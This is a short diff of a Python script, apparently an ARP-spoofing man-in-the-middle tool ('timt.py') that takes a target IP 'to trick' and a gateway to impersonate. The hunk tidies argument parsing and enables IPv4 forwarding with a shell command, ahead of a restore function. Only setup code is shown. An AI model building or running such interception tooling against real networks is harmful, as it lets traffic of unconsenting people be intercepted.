@@ -5,30 +5,20 @@ try:
     interface = sys.argv[1]
     target_ip = sys.argv[2] #who i wanna trick
     gateway_ip = sys.argv[3] #who i wanna be now
-    conf.iface = interface
 except IndexError:
     print("timt.py <interface> <target_ip> <gateway>")
     sys.exit(1)
 
-packet_count = 1000
 
+packet_count = 1000
+conf.iface = interface
+
+
+# enabel ipv4 forward
 os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 #fo = open('/proc/sys/net/ipv4/ip_forward','w')
 #fo.write('1')
 #fo.close()
-
-    target_ip = sys.argv[2]
-    gateway_ip = sys.argv[3]
-    conf.iface = interface
-except IndexError:
-    print("timt.py <interface> <target_ip> <gateway>")
-    sys.exit()
-
-packet_count = 1000
-
-fo = open('/proc/sys/net/ipv4/ip_forward','w')
-fo.write('1')
-fo.close()
 
 
 def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
